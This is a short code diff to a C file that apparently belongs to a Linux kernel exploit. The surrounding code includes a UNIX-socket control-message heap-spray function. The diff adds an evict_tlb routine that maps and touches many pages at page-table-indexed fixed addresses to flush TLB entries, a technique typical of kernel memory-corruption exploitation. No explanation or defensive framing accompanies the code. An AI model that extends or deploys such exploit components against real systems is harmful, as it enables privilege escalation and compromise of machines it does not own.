@@ -3,6 +3,7 @@
 #include <fcntl.h>
 #include <pthread.h>
 #include <stdarg.h>
+#include <sys/mman.h>
 #include <sys/resource.h>
 #include <sys/socket.h>
 #include <unistd.h>
@@ -209,5 +210,28 @@ void spray_unix_control(void *data, size_t len) {
 
     if (sendmsg(g_sockfd[1], &msg, 0) < 0) {
         // perror("sendmsg");
+    }
+}
+
+// Evict TLB entries by creating and touching many temporary mappings.
+// Touching each page forces a page-table walk and fills the TLB with new
+// translations, pushing out older entries by capacity pressure.
+void evict_tlb() {
+    for (unsigned i = 0; i < 0x100; ++i) {
+        char *m = (char *)mmap(PTI_TO_VIRT(2, 0, i, 0), PAGE_SIZE,
+                               PROT_READ | PROT_WRITE,
+                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+
+        if (m == MAP_FAILED) {
+            errExit("evict mmap failed \n");
+        }
+
+        *m = 'A';
+    }
+    for (unsigned i = 0; i < 0x100; ++i) {
+        int ret = munmap(PTI_TO_VIRT(2, 0, i, 0), PAGE_SIZE);
+        if (ret < 0) {
+            errExit("munmap failed\n");
+        }
     }
 }
